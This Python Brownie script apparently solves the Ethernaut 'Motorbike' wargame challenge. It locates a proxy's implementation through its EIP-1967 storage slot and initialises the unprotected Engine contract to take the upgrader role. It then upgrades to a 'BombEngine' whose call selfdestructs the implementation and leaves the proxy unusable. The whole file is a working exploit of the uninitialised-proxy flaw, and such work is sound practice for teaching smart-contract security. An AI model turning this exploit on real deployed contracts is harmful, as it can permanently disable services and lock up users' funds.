from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from scripts.helper.web3 import web3
from brownie import Motorbike, Engine, BombEngine

##########################################
# Would you be able to selfdestruct its engine and make the motorbike unusable ?
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        motorbike = load_challenge(ContractObject=Motorbike, instance_key='motorbike')
    else:
        motorbike = deploy_locally(ContractObject=Motorbike, from_account=_from)
    
    # find engine contract implementation
    storage_position_impl_address = hex(int(web3.sha3(text='eip1967.proxy.implementation').hex(),16)-1)
    implementation_address = f'0x{web3.eth.get_storage_at(motorbike.address, storage_position_impl_address).hex()[-40:]}'

    # load Engine contract
    eg = Engine.at(implementation_address)

    # initialize the engine implementation
    eg.initialize(_from)

    # deploy our bomb engine contract
    be = BombEngine.deploy(_from)

    # call upgradeToAndCall() to selfdestruct the Engine implementation contract
    selfdestruct_call = be.boom.encode_input()
    eg.upgradeToAndCall(be.address, selfdestruct_call, _from)

    # check if the implementation has been self destructed by attemting to call the
    # upgrader getter function from the implmentation
    try:
        # call the getter function
        eg.upgrader()

        # print if it didnt fail
        print('The contract was not successfully self destructed')

        # return that it failed
        return False
    except:
        # print if it failed
        print('The contract was successfully self destructed')
        
        # return that it succeeded
        return True

def main():
    solve_challenge()
